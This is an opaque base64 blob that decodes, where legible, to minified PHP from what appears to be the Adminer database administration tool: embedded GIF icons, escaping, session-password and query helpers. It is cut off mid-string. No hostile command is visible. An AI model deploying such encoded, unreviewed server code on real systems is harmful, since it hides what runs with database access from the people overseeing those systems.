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WxlKGxpc3QoJHgsJFgpPWVhY2goJEVmKSl7Zm9yZWFjaCgkWA0KYXMkRWQ9PiRXKXt1bnNldCgkRWZbJHhdWyRFZF0pO2lmKGlzX2FycmF5KCRXKSl7JEVmWyR4XVtzdHJpcHNsYXNoZXMoJEVkKV09JFc7JEVmW109JiRFZlskeF1bc3RyaXBzbGFzaGVzKCRFZCldO31lbHNlJEVmWyR4XVtzdHJpcHNsYXNoZXMoJEVkKV09KCRIYz8kVzpzdHJpcHNsYXNoZXMoJFcpKTt9fX19ZnVuY3Rpb24NCmJyYWNrZXRfZXNjYXBlKCR0LCRNYT1mYWxzZSl7c3RhdGljJHFoPWFycmF5KCc6Jz0+JzoxJywnXSc9Pic6MicsJ1snPT4nOjMnKTtyZXR1cm4NCnN0cnRyKCR0LCgkTWE/YXJyYXlfZmxpcCgkcWgpOiRxaCkpO31mdW5jdGlvbg0KY2hhcnNldCgkZyl7cmV0dXJuKHZlcnNpb25fY29tcGFyZSgkZy0+c2VydmVyX2luZm8sIjUuNS4zIik+PTA/InV0ZjhtYjQiOiJ1dGY4Iik7fWZ1bmN0aW9uDQpoKCRQKXtyZXR1cm4NCnN0cl9yZXBsYWNlKCJcMCIsIiYjMDsiLGh0bWxzcGVjaWFsY2hhcnMoJFAsRU5UX1FVT1RFUywndXRmLTgnKSk7fWZ1bmN0aW9uDQpuYnNwKCRQKXtyZXR1cm4odHJpbSgkUCkhPSIiP2goJFApOiImbmJzcDsiKTt9ZnVuY3Rpb24NCm5sX2JyKCRQKXtyZXR1cm4NCnN0cl9yZXBsYWNlKCJcbiIsIjxicj4iLCRQKTt9ZnVuY3Rpb24NCmNoZWNrYm94KCRDLCRZLCRjYiwkTGQ9IiIsJExlPSIiLCRoYj0iIil7JEo9IjxpbnB1dCB0eXBlPSdjaGVja2JveCcgbmFtZT0nJEMnIHZhbHVlPSciLmgoJFkpLiInIi4oJGNiPyIgY2hlY2tlZCI6IiIpLigkTGU/JyBvbmNsaWNrPSInLmgoJExlKS4nIic6JycpLiI+IjtyZXR1cm4oJExkIT0iInx8JGhiPyI8bGFiZWwiLigkaGI/IiBjbGFzcz0nJGhiJyI6IiIpLiI+JEoiLmgoJExkKS4iPC9sYWJlbD4iOiRKKTt9ZnVuY3Rpb24NCm9wdGlvbmxpc3QoJFJlLCRwZz1udWxsLCRMaD1mYWxzZSl7JEo9IiI7Zm9yZWFjaCgkUmUNCmFzJEVkPT4kVyl7JFNlPWFycmF5KCRFZD0+JFcpO2lmKGlzX2FycmF5KCRXKSl7JEouPSc8b3B0Z3JvdXAgbGFiZWw9IicuaCgkRWQpLiciPic7JFNlPSRXO31mb3JlYWNoKCRTZQ0KYXMkeD0+JFgpJEouPSc8b3B0aW9uJy4oJExofHxpc19zdHJpbmcoJHgpPycgdmFsdWU9IicuaCgkeCkuJyInOicnKS4oKCRMaHx8aXNfc3RyaW5nKCR4KT8oc3RyaW5nKSR4OiRYKT09PSRwZz8nIHNlbGVjdGVkJzonJykuJz4nLmgoJFgpO2lmKGlzX2FycmF5KCRXKSkkSi49Jzwvb3B0Z3JvdXA+Jzt9cmV0dXJuJEo7fWZ1bmN0aW9uDQpodG1sX3NlbGVjdCgkQywkUmUsJFk9IiIsJEtlPXRydWUpe2lmKCRLZSlyZXR1cm4iPHNlbGVjdCBuYW1lPSciLmgoJEMpLiInIi4oaXNfc3RyaW5nKCRLZSk/JyBvbmNoYW5nZT0iJy5oKCRLZSkuJyInOiIiKS4iPiIub3B0aW9ubGlzdCgkUmUsJFkpLiI8L3NlbGVjdD4iOyRKPSIiO2ZvcmVhY2goJFJlDQphcyR4PT4kWCkkSi49IjxsYWJlbD48aW5wdXQgdHlwZT0ncmFkaW8nIG5hbWU9JyIuaCgkQykuIicgdmFsdWU9JyIuaCgkeCkuIiciLigkeD09JFk/IiBjaGVja2VkIjoiIikuIj4iLmgoJFgpLiI8L2xhYmVsPiI7cmV0dXJuJEo7fWZ1bmN0aW9uDQpzZWxlY3RfaW5wdXQoJElhLCRSZSwkWT0iIiwkcmY9IiIpe3JldHVybigkUmU/IjxzZWxlY3QkSWE+PG9wdGlvbiB2YWx1ZT0nJz4kcmYiLm9wdGlvbmxpc3QoJFJlLCRZLHRydWUpLiI8L3NlbGVjdD4iOiI8aW5wdXQkSWEgc2l6ZT0nMTAnIHZhbHVlPSciLmgoJFkpLiInIHBsYWNlaG9sZGVyPSckcmYnPiIpO31mdW5jdGlvbg0KY29uZmlybSgpe3JldHVybiIgb25jbGljaz1cInJldHVybiBjb25maXJtKCciLidBcmUgeW91IHN1cmU/Jy4iJyk7XCIiO31mdW5jdGlvbg0KcHJpbnRfZmllbGRzZXQoJGhkLCRTZCwkV2g9ZmFsc2UsJExlPSIiKXtlY2hvIjxmaWVsZHNldD48bGVnZW5kPjxhIGhyZWY9JyNmaWVsZHNldC0kaGQnIG9uY2xpY2s9XCIiLmgoJExlKS4icmV0dXJuICF0b2dnbGUoJ2ZpZWxkc2V0LSRoZCcpO1wiPiRTZDwvYT48L2xlZ2VuZD48ZGl2IGlkPSdmaWVsZHNldC0kaGQnIi4oJFdoPyIiOiIgY2xhc3M9J2hpZGRlbiciKS4iPlxuIjt9ZnVuY3Rpb24NCmJvbGQoJFVhLCRoYj0iIil7cmV0dXJuKCRVYT8iIGNsYXNzPSdhY3RpdmUgJGhiJyI6KCRoYj8iIGNsYXNzPSckaGInIjoiIikpO31mdW5jdGlvbg0Kb2RkKCRKPScgY2xhc3M9Im9kZCInKXtzdGF0aWMkcz0wO2lmKCEkSikkcz0tMTtyZXR1cm4oJHMrKyUyPyRKOicnKTt9ZnVuY3Rpb24NCmpzX2VzY2FwZSgkUCl7cmV0dXJuDQphZGRjc2xhc2hlcygkUCwiXHJcbidcXC8iKTt9ZnVuY3Rpb24NCmpzb25fcm93KCR4LCRYPW51bGwpe3N0YXRpYyRJYz10cnVlO2lmKCRJYyllY2hvInsiO2lmKCR4IT0iIil7ZWNobygkSWM/IiI6IiwiKS4iXG5cdFwiIi5hZGRjc2xhc2hlcygkeCwiXHJcblwiXFwvIikuJyI6ICcuKCRYIT09bnVsbD8nIicuYWRkY3NsYXNoZXMoJFgsIlxyXG5cIlxcLyIpLiciJzondW5kZWZpbmVkJyk7JEljPWZhbHNlO31lbHNle2VjaG8iXG59XG4iOyRJYz10cnVlO319ZnVuY3Rpb24NCmluaV9ib29sKCRyZCl7JFg9aW5pX2dldCgkcmQpO3JldHVybihwcmVnX21hdGNoKCd+Xihvbnx0cnVlfHllcykkfmknLCRYKXx8KGludCkkWCk7fWZ1bmN0aW9uDQpzaWQoKXtzdGF0aWMkSjtpZigkSj09PW51bGwpJEo9KFNJRCYmISgkX0NPT0tJRSYmaW5pX2Jvb2woInNlc3Npb24udXNlX2Nvb2tpZXMiKSkpO3JldHVybiRKO31mdW5jdGlvbg0Kc2V0X3Bhc3N3b3JkKCRTaCwkTiwkViwkRyl7JF9TRVNTSU9OWyJwd2RzIl1bJFNoXVskTl1bJFZdPSgkX0NPT0tJRVsiYWRtaW5lcl9rZXkiXSYmaXNfc3RyaW5nKCRHKT9hcnJheShlbmNyeXB0X3N0cmluZygkRywkX0NPT0tJRVsiYWRtaW5lcl9rZXkiXSkpOiRHKTt9ZnVuY3Rpb24NCmdldF9wYXNzd29yZCgpeyRKPWdldF9zZXNzaW9uKCJwd2RzIik7aWYoaXNfYXJyYXkoJEopKSRKPSgkX0NPT0tJRVsiYWRtaW5lcl9rZXkiXT9kZWNyeXB0X3N0cmluZygkSlswXSwkX0NPT0tJRVsiYWRtaW5lcl9rZXkiXSk6ZmFsc2UpO3JldHVybiRKO31mdW5jdGlvbg0KcSgkUCl7Z2xvYmFsJGc7cmV0dXJuJGctPnF1b3RlKCRQKTt9ZnVuY3Rpb24NCmdldF92YWxzKCRILCRlPTApe2dsb2JhbCRnOyRKPWFycmF5KCk7JEk9JGctPnF1ZXJ5KCRIKTtpZihpc19vYmplY3QoJEkpKXt3aGlsZSgkSz0kSS0+ZmV0Y2hfcm93KCkpJEpbXT0kS1skZV07fXJldHVybiRKO31mdW5jdGlvbg0KZ2V0X2tleV92YWxzKCRILCRoPW51bGwsJGdoPTApe2dsb2JhbCRnO2lmKCFpc19vYmplY3QoJGgpKSRoPSRnOyRKPWFycmF5KCk7JGgtPnRpbWVvdXQ9JGdoOyRJPSRoLT5xdWVyeSgkSCk7JGgtPnRpbWVvdXQ9MDtpZihpc19vYmplY3QoJEkpKXt3aGlsZSgkSz0kSS0+ZmV0Y2hfcm93KCkpJEpbJEtbMF1dPSRLWzFdO31yZXR1cm4kSjt9ZnVuY3Rpb24NCmdldF9yb3dzKCRILCRoPW51bGwsJG49IjxwIGNsYXNzPSdlcnJvcic+Iil7Z2xvYmFsJGc7JHRiPShpc19vYmplY3QoJGgpPyRoOiRnKTskSj1hcnJheSgpOyRJPSR0Yi0+cXVlcnkoJEgpO2lmKGlzX29iamVjdCgkSSkpe3doaWxlKCRLPSRJLT5mZXRjaF9hc3NvYygpKSRKW109JEs7fWVsc2VpZighJEkmJiFpc19vYmplY3QoJGgpJiYkbiYmZGVmaW5lZCgiUEFHRV9IRUFERVIiKSllY2hvJG4uZXJyb3IoKS4iXG4iO3JldHVybiRKO31mdW5jdGlvbg0KdW5pcXVlX2FycmF5KCRLLCR2KXtmb3JlYWNoKCR2DQphcyR1KXtpZihwcmVnX21hdGNoKCJ+UFJJTUFSWXxVTklRVUV+IiwkdVsidHlwZSJdKSl7JEo9YXJyYXkoKTtmb3JlYWNoKCR1WyJjb2x1bW5zIl1hcyR4KXtpZighaXNzZXQoJEtbJHhdKSljb250aW51ZQ0KMjskSlskeF09JEtbJHhdO31yZXR1cm4kSjt9fX1mdW5jdGlvbg0KZXNjYXBlX2tleSgkeCl7aWYocHJlZ19tYXRjaCgnKF4oW1x3KF0rKSgnLnN0cl9yZXBsYWNlKCJfIiwiLioiLHByZWdfcXVvdGUoaWRmX2VzY2FwZSgiXyIpKSkuJykoWyBcdyldKykkKScsJHgsJEIpKXJldHVybiRCWzFdLmlkZl9lc2NhcGUoaWRmX3VuZXNjYXBlKCRCWzJdKSkuJEJbM107cmV0dXJuDQppZGZfZXNjYXBlKCR4KTt9ZnVuY3Rpb24NCndoZXJlKCRaLCRwPWFycmF5KCkpe2dsb2JhbCRnLCR3OyRKPWFycmF5KCk7Zm9yZWFjaCgoYXJyYXkpJFpbIndoZXJlIl1hcyR4PT4kWCl7JHg9YnJhY2tldF9lc2NhcGUoJHgsMSk7JGU9ZXNjYXBlX2tleSgkeCk7JEpbXT0kZS4oKCR3PT0ic3FsIiYmcHJlZ19tYXRjaCgnfl5bMC05XSpcXC5bMC05XSokficsJFgpKXx8JHc9PSJtc3NxbCI/IiBMSUtFICIucShhZGRjc2xhc2hlcygkWCwiJV9cXCIpKToiID0gIi51bmNvbnZlcnRfZmllbGQoJHBbJHhdLHEoJFgpKSk7aWYoJHc9PSJzcWwiJiZwcmVnX21hdGNoKCd+Y2hhcnx0ZXh0ficsJHBbJHhdWyJ0eXBlIl0pJiZwcmVnX21hdGNoKCJ+W14gLUBdfiIsJFgpKSRKW109IiRlID0gIi5xKCRYKS4iIENPTExBVEUgIi5jaGFyc2V0KCRnKS4iX2JpbiI7fWZvcmVhY2goKGFycmF5KSRaWyJudWxsIl1hcyR4KSRKW109ZXNjYXBlX2tleSgkeCkuIiBJUyBOVUxMIjtyZXR1cm4NCmltcGxvZGUoIiBBTkQgIiwkSik7fWZ1bmN0aW9uDQp3aGVyZV9jaGVjaygkWCwkcD1hcnJheSgpKXtwYXJzZV9zdHIoJFgsJGFiKTtyZW1vdmVfc2xhc2hlcyhhcnJheSgmJGFiKSk7cmV0dXJuDQp3aGVyZSgkYWIsJHApO31mdW5jdGlvbg0Kd2hlcmVfbGluaygkcywkZSwkWSwkTmU9Ij0iKXtyZXR1cm4iJndoZXJlJTVCJHMlNUQlNUJjb2wlNUQ9Ii51cmxlbmNvZGUoJGUpLiImd2hlcmUlNUIkcyU1RCU1Qm9wJTVEPSIudXJsZW5jb2RlKCgkWSE9PW51bGw/JE5lOiJJUyBOVUxMIikpLiImd2hlcmUlNUIkcyU1RCU1QnZhbCU1RD0iLnVybGVuY29kZSgkWSk7fWZ1bmN0aW9uDQpjb252ZXJ0X2ZpZWxkcygkZiwkcCwkTT1hcnJheSgpKXskSj0iIjtmb3JlYWNoKCRmDQphcyR4PT4kWCl7aWYoJE0mJiFpbl9hcnJheShpZGZfZXNjYXBlKCR4KSwkTSkpY29udGludWU7JEZhPWNvbnZlcnRfZmllbGQoJHBbJHhdKTtpZigkRmEpJEouPSIsICRGYSBBUyAiLmlkZl9lc2NhcGUoJHgpO31yZXR1cm4kSjt9ZnVuY3Rpb24NCmNvb2tpZSgkQywkWSwkVWQ9MjU5MjAwMCl7Z2xvYmFsJGJhOyRGPWFycmF5KCRDLChwcmVnX21hdGNoKCJ+XG5+IiwkWSk/IiI6JFkpLCgkVWQ/dGltZSgpKyRVZDowKSxwcmVnX3JlcGxhY2UoJ35cXD8uKn4nLCcnLCRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdKSwiIiwkYmEpO2lmKHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwnNS4yLjAnKT49MCkkRltdPXRydWU7cmV0dXJuDQpjYWxsX3VzZXJfZnVuY19hcnJheSgnc2V0Y29va2llJywkRik7fWZ1bmN0aW9uDQpyZXN0YXJ0X3Nlc3Npb24oKXtpZighaW5pX2Jvb2woInNlc3Npb24udXNlX2Nvb2tpZXMiKSlzZXNzaW9uX3N0YXJ0KCk7fWZ1bmN0aW9uDQpzdG9wX3Nlc3Npb24oKXtpZighaW5pX2Jvb2woInNlc3Npb24udXNlX2Nvb2tpZXMiKSlzZXNzaW9uX3dyaXRlX2Nsb3NlKCk7fWZ1bmN0aW9uJmdldF9zZXNzaW9uKCR4KXtyZXR1cm4kX1NFU1NJT05bJHhdW0RSSVZFUl1bU0VSVkVSXVskX0dFVFsidXNlcm5hbWUiXV07fWZ1bmN0aW9uDQpzZXRfc2Vzc2lvbigkeCwkWCl7JF9TRVNTSU9OWyR4XVtEUklWRVJdW1NFUlZFUl1bJF9HRVRbInVzZXJuYW1lIl1dPSRYO31mdW5jdGlvbg0KYXV0aF91cmwoJFNoLCROLCRWLCRtPW51bGwpe2dsb2JhbCRWYjtwcmVnX21hdGNoKCd+KFteP10qKVxcPz8oLiopficscmVtb3ZlX2Zyb21fdXJpKGltcGxvZGUoInwiLGFycmF5X2tleXMoJFZiKSkuInx1c2VybmFtZXwiLigkbSE9PW51bGw/ImRifCI6IiIpLnNlc3Npb25fbmFtZSgpKSwkQik7cmV0dXJuIiRCWzFdPyIuKHNpZCgpP1NJRC4iJiI6IiIpLigkU2ghPSJzZXJ2ZXIifHwkTiE9IiI/dXJsZW5jb2RlKCRTaCkuIj0iLnVybGVuY29kZSgkTikuIiYiOiIiKS4idXNlcm5hbWU9Ii51cmxlbmNvZGUoJFYpLigkbSE9IiI/IiZkYj0iLnVybGVuY29kZSgkbSk6IiIpLigkQlsyXT8iJiRCWzJdIjoiIik7fWZ1bmN0aW9uDQppc19hamF4KCl7cmV0dXJuKCRfU0VSVkVSWyJIVFRQX1hfUkVRVUVTVEVEX1dJVEgiXT09IlhNTEh0dHBSZXF1ZXN0Iik7fWZ1bmN0aW9uDQpyZWRpcmVjdCgkQSwkaWU9bnVsbCl7aWYoJGllIT09bnVsbCl7cmVzdGFydF9zZXNzaW9uKCk7JF9TRVNTSU9OWyJtZXNzYWdlcyJdW3ByZWdfcmVwbGFjZSgnfl5bXj9dKn4nLCcnLCgkQSE9PW51bGw/JEE6JF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0pKV1bXT0kaWU7fWlmKCRBIT09bnVsbCl7aWYoJEE9PSIiKSRBPSIuIjtoZWFkZXIoIkxvY2F0aW9uOiAkQSIpO2V4aXQ7fX1mdW5jdGlvbg0KcXVlcnlfcmVkaXJlY3QoJEgsJEEsJGllLCRPZj10cnVlLCR1Yz10cnVlLCRCYz1mYWxzZSwkZmg9IiIpe2dsb2JhbCRnLCRuLCRiO2lmKCR1Yyl7JEVnPW1pY3JvdGltZSh0cnVlKTskQmM9ISRnLT5xdWVyeSgkSCk7JGZoPWZvcm1hdF90aW1lKCRFZyk7fSRDZz0iIjtpZigkSCkkQ2c9JGItPm1lc3NhZ2VRdWVyeSgkSCwkZmgpO2lmKCRCYyl7JG49ZXJyb3IoKS4kQ2c7cmV0dXJuDQpmYWxzZTt9aWYoJE9mKXJlZGlyZWN0KCRBLCRpZS4kQ2cpO3JldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCnF1ZXJpZXMoJEgpe2dsb2JhbCRnO3N0YXRpYyRJZj1hcnJheSgpO3N0YXRpYyRFZztpZighJEVnKSRFZz1taWNyb3RpbWUodHJ1ZSk7aWYoJEg9PT1udWxsKXJldHVybg0KYXJyYXkoaW1wbG9kZSgiXG4iLCRJZiksZm9ybWF0X3RpbWUoJEVnKSk7JElmW109KHByZWdfbWF0Y2goJ347JH4nLCRIKT8iREVMSU1JVEVSIDs7XG4kSDtcbkRFTElNSVRFUiAiOiRIKS4iOyI7cmV0dXJuJGctPnF1ZXJ5KCRIKTt9ZnVuY3Rpb24NCmFwcGx5X3F1ZXJpZXMoJEgsJFMsJHFjPSd0YWJsZScpe2ZvcmVhY2goJFMNCmFzJFEpe2lmKCFxdWVyaWVzKCIkSCAiLiRxYygkUSkpKXJldHVybg0KZmFsc2U7fXJldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCnF1ZXJpZXNfcmVkaXJlY3QoJEEsJGllLCRPZil7bGlzdCgkSWYsJGZoKT1xdWVyaWVzKG51bGwpO3JldHVybg0KcXVlcnlfcmVkaXJlY3QoJElmLCRBLCRpZSwkT2YsZmFsc2UsISRPZiwkZmgpO31mdW5jdGlvbg0KZm9ybWF0X3RpbWUoJEVnKXtyZXR1cm4NCnNwcmludGYoJyUuM2YgcycsbWF4KDAsbWljcm90aW1lKHRydWUpLSRFZykpO31mdW5jdGlvbg0KcmVtb3ZlX2Zyb21fdXJpKCRmZj0iIil7cmV0dXJuDQpzdWJzdHIocHJlZ19yZXBsYWNlKCJ+KD88PVs/Jl0pKCRmZiIuKFNJRD8iIjoifCIuc2Vzc2lvbl9uYW1lKCkpLiIpPVteJl0qJn4iLCcnLCIkX1NFUlZFUltSRVFVRVNUX1VSSV0mIiksMCwtMSk7fWZ1bmN0aW9uDQpwYWdpbmF0aW9uKCRFLCRDYil7cmV0dXJuIiAiLigkRT09JENiPyRFKzE6JzxhIGhyZWY9IicuaChyZW1vdmVfZnJvbV91cmkoInBhZ2UiKS4oJEU/IiZwYWdlPSRFIi4oJF9HRVRbIm5leHQiXT8iJm5leHQ9Ii51cmxlbmNvZGUoJF9HRVRbIm5leHQiXSk6IiIpOiIiKSkuJyI+Jy4oJEUrMSkuIjwvYT4iKTt9ZnVuY3Rpb24NCmdldF9maWxlKCR4LCRJYj1mYWxzZSl7JEZjPSRfRklMRVNbJHhdO2lmKCEkRmMpcmV0dXJuDQpudWxsO2ZvcmVhY2goJEZjDQphcyR4PT4kWCkkRmNbJHhdPShhcnJheSkkWDskSj0nJztmb3JlYWNoKCRGY1siZXJyb3IiXWFzJHg9PiRuKXtpZigkbilyZXR1cm4kbjskQz0kRmNbIm5hbWUiXVskeF07JG5oPSRGY1sidG1wX25hbWUiXVskeF07JHZiPWZpbGVfZ2V0X2NvbnRlbnRzKCRJYiYmcHJlZ19tYXRjaCgnflxcLmd6JH4nLCRDKT8iY29tcHJlc3MuemxpYjovLyRuaCI6JG5oKTtpZigkSWIpeyRFZz1zdWJzdHIoJHZiLDAsMyk7aWYoZnVuY3Rpb25fZXhpc3RzKCJpY29udiIpJiZwcmVnX21hdGNoKCJ+Xlx4RkVceEZGfF5ceEZGXHhGRX4iLCRFZywkVWYpKSR2Yj1pY29udigidXRmLTE2IiwidXRmLTgiLCR2Yik7ZWxzZWlmKCRFZz09Ilx4RUZceEJCXHhCRiIpJHZiPXN1YnN0cigkdmIsMyk7JEouPSR2Yi4iXG5cbiI7fWVsc2UkSi49JHZiO31yZXR1cm4kSjt9ZnVuY3Rpb24NCnVwbG9hZF9lcnJvcigkbil7JGZlPSgkbj09VVBMT0FEX0VSUl9JTklfU0laRT9pbmlfZ2V0KCJ1cGxvYWRfbWF4X2ZpbGVzaXplIik6MCk7cmV0dXJuKCRuPydVbmFibGUgdG8gdXBsb2FkIGEgZmlsZS4nLigkZmU/IiAiLnNwcmlud